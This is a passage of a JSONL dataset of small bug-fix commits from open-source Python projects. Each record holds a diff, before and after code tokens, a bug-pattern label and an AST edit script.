, \"1-person\" , \"2-person\" , \"3-person\" , \"4-person\" , \"5-person\" , \"6-person\" , \"7-or-more person\" , \"Total households\" , \"1-person\" , \"2-person\" , \"3-person\" , \"4-person\" , \"5-person\" , \"6-person\" , \"7-or-more person\" ]", "after": "self . columns = Base_Table . columns + [ \"Family households\" , \"2-person 1\" , \"3-person 1\" , \"4-person 1\" , \"5-person 1\" , \"6-person 1\" , \"7-or-more person 1\" , \"Nonfamily households\" , \"1-person 2\" , \"2-person 2\" , \"3-person 2\" , \"4-person 2\" , \"5-person 2\" , \"6-person 2\" , \"7-or-more person 2\" , \"Total households\" , \"1-person 3\" , \"2-person 3\" , \"3-person 3\" , \"4-person 3\" , \"5-person 3\" , \"6-person 3\" , \"7-or-more person 3\" ]", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Move\", [\"string:\\\"5-person\\\"\", 3, 93, 3, 103], [\"list\", 3, 39, 3, 347], 10], [\"Move\", [\"string:\\\"6-person\\\"\", 3, 104, 3, 114], [\"list\", 3, 39, 3, 347], 13], [\"Move\", [\"string:\\\"7-or-more person \\\"\", 3, 115, 3, 134], [\"list\", 3, 39, 3, 347], 14], [\"Move\", [\"string:\\\"1-person\\\"\", 3, 158, 3, 168], [\"list\", 3, 39, 3, 347], 18], [\"Move\", [\"string:\\\"2-person\\\"\", 3, 169, 3, 179], [\"list\", 3, 39, 3, 347], 20], [\"Move\", [\"string:\\\"3-person\\\"\", 3, 180, 3, 190], [\"list\", 3, 39, 3, 347], 21], [\"Move\", [\",:,\", 3, 212, 3, 213], [\"list\", 3, 39, 3, 347], 22], [\"Move\", [\",:,\", 3, 223, 3, 224], [\"list\", 3, 39, 3, 347], 24], [\"Move\", [\"string:\\\"7-or-more person\\\"\", 3, 224, 3, 242], [\"list\", 3, 39, 3, 347], 28], [\"Move\", [\",:,\", 3, 272, 3, 273], [\"list\", 3, 39, 3, 347], 29], [\"Move\", [\",:,\", 3, 283, 3, 284], [\"list\", 3, 39, 3, 347], 31], [\"Move\", [\",:,\", 3, 294, 3, 295], [\"list\", 3, 39, 3, 347], 33], [\"Move\", [\",:,\", 3, 316, 3, 317], [\"list\", 3, 39, 3, 347], 35], [\"Move\", [\",:,\", 3, 327, 3, 328], [\"list\", 3, 39, 3, 347], 37], [\"Update\", [\"string:\\\"2-person\\\"\", 3, 60, 3, 70], \"\\\"2-person 1\\\"\"], [\"Update\", [\"string:\\\"3-person\\\"\", 3, 71, 3, 81], \"\\\"3-person 1\\\"\"], [\"Update\", [\"string:\\\"4-person\\\"\", 3, 82, 3, 92], \"\\\"4-person 1\\\"\"], [\"Update\", [\"string:\\\"5-person\\\"\", 3, 93, 3, 103], \"\\\"5-person 1\\\"\"], [\"Update\", [\"string:\\\"6-person\\\"\", 3, 104, 3, 114], \"\\\"6-person 1\\\"\"], [\"Update\", [\"string:\\\"7-or-more person \\\"\", 3, 115, 3, 134], \"\\\"7-or-more person 1\\\"\"], [\"Insert\", [\"list\", 3, 39, 3, 347], [\",:,\", \"T\"], 14], [\"Update\", [\"string:\\\"1-person\\\"\", 3, 158, 3, 168], \"\\\"1-person 2\\\"\"], [\"Update\", [\"string:\\\"2-person\\\"\", 3, 169, 3, 179], \"\\\"2-person 2\\\"\"], [\"Update\", [\"string:\\\"3-person\\\"\", 3, 180, 3, 190], \"\\\"3-person 2\\\"\"], [\"Update\", [\"string:\\\"4-person\\\"\", 3, 191, 3, 201], \"\\\"4-person 2\\\"\"], [\"Update\", [\"string:\\\"5-person\\\"\", 3, 202, 3, 212], \"\\\"5-person 2\\\"\"], [\"Insert\", [\"list\", 3, 39, 3, 347], [\",:,\", \"T\"], 27], [\"Update\", [\"string:\\\"6-person\\\"\", 3, 213, 3, 223], \"\\\"6-person 2\\\"\"], [\"Update\", [\"string:\\\"7-or-more person\\\"\", 3, 224, 3, 242], \"\\\"7-or-more person 2\\\"\"], [\"Update\", [\"string:\\\"1-person\\\"\", 3, 262, 3, 272], \"\\\"1-person 3\\\"\"], [\"Update\", [\"string:\\\"2-person\\\"\", 3, 273, 3, 283], \"\\\"2-person 3\\\"\"], [\"Update\", [\"string:\\\"3-person\\\"\", 3, 284, 3, 294], \"\\\"3-person 3\\\"\"], [\"Update\", [\"string:\\\"4-person\\\"\", 3, 295, 3, 305], \"\\\"4-person 3\\\"\"], [\"Update\", [\"string:\\\"5-person\\\"\", 3, 306, 3, 316], \"\\\"5-person 3\\\"\"], [\"Insert\", [\"list\", 3, 39, 3, 347], [\",:,\", \"T\"], 44], [\"Update\", [\"string:\\\"6-person\\\"\", 3, 317, 3, 327], \"\\\"6-person 3\\\"\"], [\"Insert\", [\"list\", 3, 39, 3, 347], [\",:,\", \"T\"], 47], [\"Update\", [\"string:\\\"7-or-more person\\\"\", 3, 328, 3, 346], \"\\\"7-or-more person 3\\\"\"], [\"Delete\", [\",:,\", 3, 92, 3, 93]], [\"Delete\", [\",:,\", 3, 157, 3, 158]], [\"Delete\", [\",:,\", 3, 201, 3, 202]], [\"Delete\", [\",:,\", 3, 261, 3, 262]]]"}
{"project": "fapistrano", "commit_sha": "ff84826f1ea2f73f767a5c24cfb5e7193aac9393", "parent_sha": "0e8bf7e8799c79c0fb9c63ad4cc661e724f87e6d", "file_path": "fapistrano/plugins/git.py", "project_url": "https://github.com/soasme/fapistrano", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -72,7 +72,7 @@ def publish_git_repo_as_current_release(**kwargs):\n                 run('rm -rf %(release_path)s/_build' % env)\n                 exit()\n         with cd('%(releases_path)s' % env):\n-            run('mv _build %(new_release)s' % env)\n+            run('cp -r _build/* %(new_release)s' % env)\n \n def _clone_git_repo(repo, branch='master'):\n     green_alert('Cloning the latest code')\n", "before": "run ( 'mv _build %(new_release)s' % env )", "after": "run ( 'cp -r _build/* %(new_release)s' % env )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'mv _build %(new_release)s'\", 3, 17, 3, 44], \"'cp -r _build/* %(new_release)s'\"]]"}
{"project": "fapistrano", "commit_sha": "0cf5aa7d69737b45fbdea7cc1520807a361c2072", "parent_sha": "72572e99e5532dd2341a5b3a9c589ac07839b419", "file_path": "fapistrano/plugins/supervisorctl.py", "project_url": "https://github.com/soasme/fapistrano", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -38,4 +38,4 @@ def _restart_service_via_supervisor(**kwargs):\n                 run('supervisorctl start %(supervisor_target)s' % env)\n \n         # since supervisorctl does not support `supervisorctl status group_name:*` syntax\n-        run('supervisorctl status | grep %(project_name)s' % env)\n+        run('supervisorctl status %(supervisor_target)s' % env)\n", "before": "run ( 'supervisorctl status | grep %(project_name)s' % env )", "after": "run ( 'supervisorctl status %(supervisor_target)s' % env )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'supervisorctl status | grep %(project_name)s'\", 3, 13, 3, 59], \"'supervisorctl status %(supervisor_target)s'\"]]"}
{"project": "PyMySQL", "commit_sha": "13ac26a744bdd91765898275d4dbfbc3d87d3c33", "parent_sha": "b3b28263ef84d0d26b042f4abd778a6f77b45238", "file_path": "pymysql/connections.py", "project_url": "https://github.com/fanout/PyMySQL", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -669,7 +669,7 @@ class Connection(object):\n             self._get_server_information()\n             self._request_authentication()\n         except socket.error, e:\n-            raise OperationalError(2003, \"Can't connect to MySQL server on %r (%d)\" % (self.host, e.args[0]))\n+            raise OperationalError(2003, \"Can't connect to MySQL server on %r (%s)\" % (self.host, e.args[0]))\n \n     def read_packet(self, packet_type=MysqlPacket):\n", "before": "except socket . error , e : raise OperationalError ( 2003 , \"Can't connect to MySQL server on %r (%d)\" % ( self . host , e . args [ 0 ] ) )", "after": "except socket . error , e : raise OperationalError ( 2003 , \"Can't connect to MySQL server on %r (%s)\" % ( self . host , e . args [ 0 ] ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"Can't connect to MySQL server on %r (%d)\\\"\", 3, 42, 3, 84], \"\\\"Can't connect to MySQL server on %r (%s)\\\"\"]]"}
{"project": "larray", "commit_sha": "2aec5be4609ab9d0a80cfb7c55294f0aa540c2f9", "parent_sha": "f12329dd980b222bc3d14d04d24a0b787d6db7b9", "file_path": "test_la.py", "project_url": "https://github.com/alixdamman/larray", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1004,7 +1004,7 @@ sex\\lipro | P01 | P02 | P03 | P04 | P05\n         self._assert_equal_raw(la_int // 2, raw_int // 2)\n \n         # test adding two larrays with different axes order\n-        self._assert_equal_raw(la + la.transpose(), raw.T * 2)\n+        self._assert_equal_raw(la + la.transpose(), raw * 2)\n \n     # def test_boolean_indexing(self):\n     #     raw = self.small_data\n", "before": "self . _assert_equal_raw ( la + la . transpose ( ) , raw . T * 2 )", "after": "self . _assert_equal_raw ( la + la . transpose ( ) , raw * 2 )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Move\", [\"binary_operator\", 3, 53, 3, 62], [\"identifier:raw\", 3, 53, 3, 56], 0], [\"Delete\", [\".:.\", 3, 56, 3, 57]], [\"Delete\", [\"identifier:T\", 3, 57, 3, 58]], [\"Delete\", [\"attribute\", 3, 53, 3, 58]]]"}
{"project": "pyload.plugins", "commit_sha": "c34ce034ceff9cd99e9e49c32128d090888d93cc", "parent_sha": "2ecd18db134efa59aba6b809a4bf0bb5fa4d3d48", "file_path": "module/plugins/Account.py", "project_url": "https://github.com/vuolter/pyload.plugins", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -287,7 +287,7 @@ class Account(Base):\n     def checkLogin(self, user):\n         \"\"\" checks if user is still logged in \"\"\"\n         if user in self.timestamps:\n-            if self.login_timeout > 0 and self.timestamps[user] + login_timeout * 60 > time():\n+            if self.login_timeout > 0 and self.timestamps[user] + self.login_timeout * 60 > time():\n                 self.logDebug(\"Reached login timeout for %s\" % user)\n                 return self.relogin(user)\n             else:\n", "before": "if self . login_timeout > 0 and self . timestamps [ user ] + login_timeout * 60 > time ( ) : self . logDebug ( \"Reached login timeout for %s\" % user ) return self . relogin ( user ) else : ", "after": "if self . login_timeout > 0 and self . timestamps [ user ] + self . login_timeout * 60 > time ( ) : self . logDebug ( \"Reached login timeout for %s\" % user ) return self . relogin ( user ) else : ", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 67, 3, 85], [\"attribute\", \"N0\"], 0], [\"Insert\", \"N0\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:login_timeout\", 3, 67, 3, 80], 2]]"}
{"project": "pyload.plugins", "commit_sha": "9049742ba685fba578eb7e63bfea39c318bdc2b2", "parent_sha": "78e1af94a999dc007f80749cf550654c8f625a23", "file_path": "module/plugins/internal/UnRar.py", "project_url": "https://github.com/vuolter/pyload.plugins", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -209,7 +209,7 @@ class UnRar(Extractor):\n             args.append(\"-or\")\n \n         for word in self.excludefiles:\n-            args.append(\"-x'%s'\" % word.strip())\n+            args.append(\"-x%s\" % word.strip())\n \n         #: Assume yes on all queries\n         args.append(\"-y\")\n", "before": "args . append ( \"-x'%s'\" % word . strip ( ) )", "after": "args . append ( \"-x%s\" % word . strip ( ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"-x'%s'\\\"\", 3, 25, 3, 33], \"\\\"-x%s\\\"\"]]"}
{"project": "Pigrow", "commit_sha": "567474597e4ff7fcd28fa4c9e92d9cb9f661e855", "parent_sha": "7bc8d62ff7d878a84a137893538c39282bbcf555", "file_path": "scripts/pi_eye_logger_2.py", "project_url": "https://github.com/arunderwood/Pigrow", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -44,7 +44,7 @@ def save_log(pi):\n     log = log + \"\\n\"\n \n     print log\n-    pi_log = \"/home/\"+user_name+path+\"logs/TEST_pieye_log_\"+str(pi[0].split(\".\")[-1])+\".txt\"\n+    pi_log = \"/home/\"+user_name+path+\"logs/pieye_log_\"+str(pi[0].split(\".\")[-1])+\".txt\"\n     with open(pi_log, \"a\") as f:\n         f.write(log)\n \n", "before": "pi_log = \"/home/\" + user_name + path + \"logs/TEST_pieye_log_\" + str ( pi [ 0 ] . split ( \".\" ) [ - 1 ] ) + \".txt\"", "after": "pi_log = \"/home/\" + user_name + path + \"logs/pieye_log_\" + str ( pi [ 0 ] . split ( \".\" ) [ - 1 ] ) + \".txt\"", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"logs/TEST_pieye_log_\\\"\", 3, 38, 3, 60], \"\\\"logs/pieye_log_\\\"\"]]"}
{"project": "tracer-1", "commit_sha": "27edec4500d272f8e2e4b0b2a1b642b52a6f8316", "parent_sha": "fe06028976f7e35074cd58cb1cd0290bedd52823", "file_path": "tracer/runner.py", "project_url": "https://github.com/chubbymaggie/tracer-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -235,7 +235,7 @@ class Runner(object):\n \n         args += [self.binary]\n         if self.bitflip:\n-            args = [args[0]] + \"-bitflip\" + args[1:]\n+            args = [args[0]] + [\"-bitflip\"] + args[1:]\n \n         with open('/dev/null', 'wb') as devnull:\n             stdout_f = devnull\n", "before": "args = [ args [ 0 ] ] + \"-bitflip\" + args [ 1 : ]", "after": "args = [ args [ 0 ] ] + [ \"-bitflip\" ] + args [ 1 : ]", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 20, 3, 42], [\"list\", \"N0\"], 2], [\"Insert\", \"N0\", [\"[:[\", \"T\"], 0], [\"Move\", \"N0\", [\"string:\\\"-bitflip\\\"\", 3, 32, 3, 42], 1], [\"Insert\", \"N0\", [\"]:]\", \"T\"], 2]]"}
{"project": "pulp_rpm", "commit_sha": "e205b84aee5908946cf799ec8f4f40e36c20f132", "parent_sha": "5dfcc956e138191667685a5b0013fe4055c69492", "file_path": "pulp_rpm/app/models/repository.py", "project_url": "https://github.com/ATIX-AG/pulp_rpm", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -82,7 +82,7 @@ class RpmRepository(Repository):\n                 # now add any content that's in the base_version but not in version\n                 version.add_content(base_version.content.exclude(pk__in=version.content))\n \n-            if Task.current and not self.sub_repo:\n+            if Task.current() and not self.sub_repo:\n                 resource = CreatedResource(content_object=version)\n                 resource.save()\n             return version\n", "before": "if Task . current and not self . sub_repo : resource = CreatedResource ( content_object = version ) resource . save ( )", "after": "if Task . current ( ) and not self . sub_repo : resource = CreatedResource ( content_object = version ) resource . save ( )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 16, 3, 50], [\"call\", \"N0\"], 0], [\"Move\", \"N0\", [\"attribute\", 3, 16, 3, 28], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "zulip", "commit_sha": "f1ad8195473c07cad36a5885d954777dc89e8706", "parent_sha": "40dfef490d1b5ee8920e7af1c25b34c856450c46", "file_path": "zerver/views/home.py", "project_url": "https://github.com/punit-agarwal/zulip", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -262,5 +262,5 @@ def is_buggy_ua(agent):\n-    return (\"Humbug Desktop/\" in agent or \"Zulip Desktop/\" in agent or \"ZulipDesktop/\" in agent) and \\\n+    return (\"Zulip Desktop/\" in agent or \"ZulipDesktop/\" in agent) and \\\n         \"Mac\" not in agent\n", "before": "return ( \"Humbug Desktop/\" in agent or \"Zulip Desktop/\" in agent or \"ZulipDesktop/\" in agent ) and \"Mac\" not in agent", "after": "return ( \"Zulip Desktop/\" in agent or \"ZulipDesktop/\" in agent ) and \"Mac\" not in agent", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Move\", [\"boolean_operator\", 0, 13, 0, 96], [\"comparison_operator\", 0, 43, 0, 68], 0], [\"Delete\", [\"string:\\\"Humbug Desktop/\\\"\", 0, 13, 0, 30]], [\"Delete\", [\"in:in\", 0, 31, 0, 33]], [\"Delete\", [\"identifier:agent\", 0, 34, 0, 39]], [\"Delete\", [\"comparison_operator\", 0, 13, 0, 39]], [\"Delete\", [\"or:or\", 0, 40, 0, 42]], [\"Delete\", [\"boolean_operator\", 0, 13, 0, 68]]]"}
{"project": "h", "commit_sha": "986c2c0db6b0fe9e8946e53aad0ca3880642be41", "parent_sha": "44e12e82601275832ef41b295383f8728308c1ff", "file_path": "h/script.py", "project_url": "https://github.com/project-star/h", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -56,7 +56,7 @@ def add_base_url(event):\n     assets_env = request.webassets_env\n     view_name = getattr(request, 'view_name', None)\n \n-    if view_name == 'embed.js' and not assets_env.url.startswith('http'):\n+    if view_name == 'embed.js' and assets_env.url.startswith('chrome-extension'):\n         base_url = join(request.webassets_env.url, '')\n     else:\n         base_url = request.resource_url(request.context, '')\n", "before": "if view_name == 'embed.js' and not assets_env . url . startswith ( 'http' ) : base_url = join ( request . webassets_env . url , '' ) else : base_url = request . resource_url ( request . context , '' )", "after": "if view_name == 'embed.js' and assets_env . url . startswith ( 'chrome-extension' ) : base_url = join ( request . webassets_env . url , '' ) else : base_url = request . resource_url ( request . context , '' )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 8, 3, 73], [\"call\", 3, 40, 3, 73], 2], [\"Update\", [\"string:'http'\", 3, 66, 3, 72], \"'chrome-extension'\"], [\"Delete\", [\"not:not\", 3, 36, 3, 39]], [\"Delete\", [\"not_operator\", 3, 36, 3, 73]]]"}
{"project": "h", "commit_sha": "adcbf8aae1262221e2ab16af5b47754f93045c48", "parent_sha": "6494e77f037dc27ff3b750fbd354b87b62c460bc", "file_path": "h/test/api_test.py", "project_url": "https://github.com/project-star/h", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -149,7 +149,7 @@ def test_index():\n     assert links['annotation']['update']['method'] == 'PUT'\n     assert links['annotation']['update']['url'] == host + '/annotations/:id'\n     assert links['search']['method'] == 'GET'\n-    assert links['search']['url'] == host + '/search'\n+    assert links['search']['url'] == host + '/annotations'\n \n \n def test_search_parameters():\n", "before": "assert links [ 'search' ] [ 'url' ] == host + '/search'", "after": "assert links [ 'search' ] [ 'url' ] == host + '/annotations'", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'/search'\", 3, 45, 3, 54], \"'/annotations'\"]]"}
{"project": "h", "commit_sha": "b290cd0354022198ea8953937077a7f1ef3da4b6", "parent_sha": "96accd8999fa793dbd679c104c77aeae20b6038b", "file_path": "h/test/api_test.py", "project_url": "https://github.com/project-star/h", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -149,7 +149,7 @@ def test_index():\n     assert links['annotation']['update']['method'] == 'PUT'\n     assert links['annotation']['update']['url'] == host + '/annotations/:id'\n     assert links['search']['method'] == 'GET'\n-    assert links['search']['url'] == host + '/annotations'\n+    assert links['search']['url'] == host + '/search'\n \n \n def test_search_parameters():\n", "before": "assert links [ 'search' ] [ 'url' ] == host + '/annotations'", "after": "assert links [ 'search' ] [ 'url' ] == host + '/search'", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'/annotations'\", 3, 45, 3, 59], \"'/search'\"]]"}
{"project": "jsonb-sqlalchemy-demo", "commit_sha": "3b683143de30d2dfe53a3cf92deb8d07106ed646", "parent_sha": "683a1c716ab20f19989de96e9806726fd6d6a520", "file_path": "model4.py", "project_url": "https://github.com/martinkirch/jsonb-sqlalchemy-demo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -41,7 +41,7 @@ class TaggedArticle(Article):\n     __mapper_args__ = {'polymorphic_identity': ArticleType.TAGGED.value}\n \n     def __repr__(self):\n-        return super().__repr__() + f\"\\n\\nTagged {self.extra['tags']}\"\n+        return super().__repr__() + f\"\\n\\nTagged {self.content['tags']}\"\n \n \n class ImageArticle(Article):\n", "before": "return super ( ) . __repr__ ( ) + f\"\\n\\nTagged {self.extra['tags']}\"", "after": "return super ( ) . __repr__ ( ) + f\"\\n\\nTagged {self.content['tags']}\"", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:f\\\"\\\\n\\\\nTagged {self.extra['tags']}\\\"\", 3, 37, 3, 71], \"f\\\"\\\\n\\\\nTagged {self.content['tags']}\\\"\"]]"}
{"project": "jip", "commit_sha": "a01bbcb90d6173eb2c6904fa26d0adc7b4b608ae", "parent_sha": "d82df44e058efc1ad28cedc19c0429c3c112b863", "file_path": "jip/repository.py", "project_url": "https://github.com/debugger87/jip", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -74,7 +74,7 @@ class RepositoryManager(object):\n             return None\n \n     def init_repos(self):\n-        for repo in (self._load_config() or [self.MAVEN_LOCAL_REPOS, self.MAVEN_PUBLIC_REPOS]):\n+        for repo in (self._load_config() or [self.MAVEN_PUBLIC_REPOS]):\n             ## create repos in order\n             name, uri, rtype = repo\n             self.add_repos(name, uri, rtype, order=len(self.repos))\n", "before": "for repo in ( self . _load_config ( ) or [ self . MAVEN_LOCAL_REPOS , self . MAVEN_PUBLIC_REPOS ] ) : name , uri , rtype = repo self . add_repos ( name , uri , rtype , order = len ( self . repos ) )", "after": "for repo in ( self . _load_config ( ) or [ self . MAVEN_PUBLIC_REPOS ] ) : name , uri , rtype = repo self . add_repos ( name , uri , rtype , order = len ( self . repos ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Delete\", [\"identifier:self\", 3, 46, 3, 50]], [\"Delete\", [\".:.\", 3, 50, 3, 51]], [\"Delete\", [\"identifier:MAVEN_LOCAL_REPOS\", 3, 51, 3, 68]], [\"Delete\", [\"attribute\", 3, 46, 3, 68]], [\"Delete\", [\",:,\", 3, 68, 3, 69]]]"}
{"project": "h", "commit_sha": "6cad26e3f0b2ad48de6ad65b5d9d5d29e4123d64", "parent_sha": "8172a68b21279ed9fc2421bd5350cdf3e9c8dda9", "file_path": "tests/functional/__init__.py", "project_url": "https://github.com/project-star/h", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -19,7 +19,7 @@ class SeleniumTestCase(TestCase):\n             caps['tags'] = [env['TRAVIS_PYTHON_VERSION'], 'CI']\n             caps['tunnel-identifier'] = env['TRAVIS_JOB_NUMBER']\n \n-            hub_url = 'http://%s:%s@localhost:4445' % (username, key)\n+            hub_url = 'http://%s:%s@localhost:4445/wd/hub' % (username, key)\n             self.driver = webdriver.Remote(desired_capabilities=caps, command_executor=hub_url)\n             self.sauce_url = \"https://saucelabs.com/jobs/%s\" % self.driver.session_id\n         else:\n", "before": "hub_url = 'http://%s:%s@localhost:4445' % ( username , key )", "after": "hub_url = 'http://%s:%s@localhost:4445/wd/hub' % ( username , key )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'http://%s:%s@localhost:4445'\", 3, 23, 3, 52], \"'http://%s:%s@localhost:4445/wd/hub'\"]]"}
{"project": "h", "commit_sha": "afd7999744ea243cc7a133504f75a2097e7a701d", "parent_sha": "4c683b7839b9d993d91064a78b6c950fc88219f2", "file_path": "h/streamer.py", "project_url": "https://github.com/project-star/h", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -218,7 +218,7 @@ class FilterHandler(object):\n         return True\n \n     def match(self, target, action=None):\n-        if not action or action == 'past' or self.filter['actions'][action]:\n+        if not action or action == 'past' or action in self.filter['actions']:\n             if len(self.filter['clauses']) > 0:\n                 return getattr(self, self.filter['match_policy'])(target)\n             else: return True\n", "before": "if not action or action == 'past' or self . filter [ 'actions' ] [ action ] : if len ( self . filter [ 'clauses' ] ) > 0 : return getattr ( self , self . filter [ 'match_policy' ] ) ( target ) else : return True", "after": "if not action or action == 'past' or action in self . filter [ 'actions' ] : if len ( self . filter [ 'clauses' ] ) > 0 : return getattr ( self , self . filter [ 'match_policy' ] ) ( target ) else : return True", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 16, 3, 76], [\"comparison_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:action\", \"T\"], 0], [\"Insert\", \"N0\", [\"in:in\", \"T\"], 1], [\"Move\", \"N0\", [\"subscript\", 3, 46, 3, 68], 2], [\"Delete\", [\"[:[\", 3, 68, 3, 69]], [\"Delete\", [\"identifier:action\", 3, 69, 3, 75]], [\"Delete\", [\"]:]\", 3, 75, 3, 76]], [\"Delete\", [\"subscript\", 3, 46, 3, 76]]]"}
{"project": "traitsgui", "commit_sha": "f268fea3720343db3d235c3874d9c29d4455c5da", "parent_sha": "8e4e2086ebb8cb681ab56e4e5055250ed6cf4b6d", "file_path": "setup.py", "project_url": "https://github.com/enthought/traitsgui", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -102,7 +102,7 @@ def generate_docs():\n             unzip_html_docs(html_zip, doc_dir)\n     else:\n         # Unzip the docs into the 'html' folder.\n-        log.info(\"Installing %s documentaion from zip file.\\n\" % INFO['name'])\n+        log.info(\"Installing %s documentation from zip file.\\n\" % INFO['name'])\n         unzip_html_docs(html_zip, doc_dir)\n \n def unzip_html_docs(src_path, dest_dir):\n", "before": "else : log . info ( \"Installing %s documentaion from zip file.\\n\" % INFO [ 'name' ] )", "after": "else : log . info ( \"Installing %s documentation from zip file.\\n\" % INFO [ 'name' ] )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"Installing %s documentaion from zip file.\\\\n\\\"\", 3, 18, 3, 63], \"\\\"Installing %s documentation from zip file.\\\\n\\\"\"]]"}
{"project": "openupgradelib", "commit_sha": "5a0a2369e08a141a9a5bc8f091c4fc0522b07fa3", "parent_sha": "0d0a1724d97dcf9caa266ba693dea0d279cbcdf5", "file_path": "openupgradelib/openupgrade.py", "project_url": "https://github.com/Tecnativa/openupgradelib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2032,7 +2032,7 @@ def add_fields(env, field_spec):\n     It's intended for being run in pre-migration scripts for pre-populating\n     fields that are going to be declared later in the module.\n \n-    NOTE: This only works in >=v8 and is not needed in >=v12, as now Odoo\n+    NOTE: This only works in >=v9 and is not needed in >=v12, as now Odoo\n     always add the XML-ID entry:\n     https://github.com/odoo/odoo/blob/9201f92a4f29a53a014b462469f27b32dca8fc5a/\n     odoo/addons/base/models/ir_model.py#L794-L802, but you can still call\n", "before": "for pre - populating fields that are going to be declared later in the module . NOTE : This only works in >= v8 and is not needed in >= v12 , as now Odoo always add the XML - ID entry : https : // github . com / odoo / odoo / blob / 9201 f92a4f29a53a014b462469f27b32dca8fc5a / odoo / addons / base / models / ir_model . py", "after": "for pre - populating fields that are going to be declared later in the module . NOTE : This only works in >= v9 and is not needed in >= v12 , as now Odoo always add the XML - ID entry : https : // github . com / odoo / odoo / blob / 9201 f92a4f29a53a014b462469f27b32dca8fc5a / odoo / addons / base / models / ir_model . py", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"identifier:v8\", 3, 32, 3, 34], \"v9\"]]"}
{"project": "django-authopenid", "commit_sha": "970966e495b4def39e95a58411301c6c6090fc9e", "parent_sha": "6c93adbd254209df16fc65b55d7345677182f072", "file_path": "views.py", "project_url": "https://github.com/powlo/django-authopenid", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -178,7 +178,7 @@ def signin(request):\n                     next = getattr(settings, 'OPENID_REDIRECT_NEXT', '/')\n \n                 sreg_req = sreg.SRegRequest(optional=['nickname','email'])\n-                redirect_to = \"%s?next=%s\" % (\n+                redirect_to = \"%s?%s\" % (\n                         get_url_host(request) + reverse('user_complete_signin'), \n                         urllib.urlencode({'next':next}))\n \n", "before": "redirect_to = \"%s?next=%s\" % ( get_url_host ( request ) + reverse ( 'user_complete_signin' ) , urllib . urlencode ( { 'next' : next } ) )", "after": "redirect_to = \"%s?%s\" % ( get_url_host ( request ) + reverse ( 'user_complete_signin' ) , urllib . urlencode ( { 'next' : next } ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"%s?next=%s\\\"\", 3, 31, 3, 43], \"\\\"%s?%s\\\"\"]]"}
{"project": "kafka-python", "commit_sha": "7aa997f7205c116582b3d5f354cff3c7eac89ad2", "parent_sha": "c6d8a536eff6e5ce205badc38b841d3bc27f40f6", "file_path": "kafka/admin/client.py", "project_url": "https://github.com/DataDog/kafka-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -334,7 +334,7 @@ class KafkaAdminClient(object):\n             # DeleteTopicsResponse returns topic_error_codes rather than topic_errors\n             for topic, error_code in getattr(response, \"topic_errors\", response.topic_error_codes):\n                 error_type = Errors.for_code(error_code)\n-                if tries and isinstance(error_type, NotControllerError):\n+                if tries and error_type is NotControllerError:\n                     # No need to inspect the rest of the errors for\n                     # non-retriable errors because NotControllerError should\n                     # either be thrown for all errors or no errors.\n", "before": "if tries and isinstance ( error_type , NotControllerError ) : ", "after": "if tries and error_type is NotControllerError : ", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 20, 3, 72], 